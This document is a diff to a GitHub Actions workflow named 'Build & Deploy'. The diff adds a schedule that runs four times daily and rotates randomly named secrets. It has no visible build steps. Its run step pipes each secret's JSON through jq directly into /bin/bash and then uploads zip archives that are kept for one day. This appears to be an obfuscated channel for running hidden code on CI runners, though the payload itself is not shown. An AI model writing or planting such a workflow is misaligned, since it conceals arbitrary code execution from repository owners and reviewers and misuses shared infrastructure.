@@ -2,6 +2,8 @@ name: Build & Deploy
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '11 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,16 +17,15 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          dtim46635: ${{ secrets.dtim46635 }}
+          wes9347: ${{ secrets.wes9347 }}
         run: |
-          printf '%s' "$dtim46635" | jq -r .mjxb227 | /bin/bash
-          printf '%s' "$mqrkd45" | jq -r .q50904 | /bin/bash
-          echo $lwfk3002 | jq -r .gka7 | /bin/bash
+          printf '%s' "$wes9347" | jq -r .q541 | /bin/bash
+          printf '%s' "$lwfk6" | jq -r .v41 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: DzuA3Y2f
+          name: x1F7FBWV
           path: "*.zip"
           retention-days: 1
